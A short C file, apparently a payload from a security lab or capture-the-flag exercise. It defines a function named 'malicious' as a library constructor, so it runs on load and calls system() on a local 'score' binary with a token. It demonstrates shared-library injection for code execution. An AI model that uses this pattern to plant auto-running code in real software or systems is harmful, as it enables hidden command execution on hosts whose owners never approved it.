#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
	    system("/usr/local/bin/score 0bbecf1c-9024-4e47-979a-000a52f6a98a");
}
